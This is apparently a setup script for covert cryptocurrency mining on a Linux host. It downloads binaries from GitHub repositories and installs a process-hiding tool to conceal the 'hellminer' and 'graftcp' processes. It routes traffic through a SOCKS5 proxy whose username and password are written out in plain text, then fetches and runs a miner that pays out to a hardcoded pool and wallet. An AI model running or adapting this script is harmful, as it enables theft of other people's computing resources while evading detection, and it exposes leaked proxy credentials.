apt update 
apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider

ph add graftcp
ph add hellminer

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 181.215.184.109:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/hellminer
chmod +x hellminer

./graftcp/graftcp ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bigbang -p x --cpu 4
sleep 2
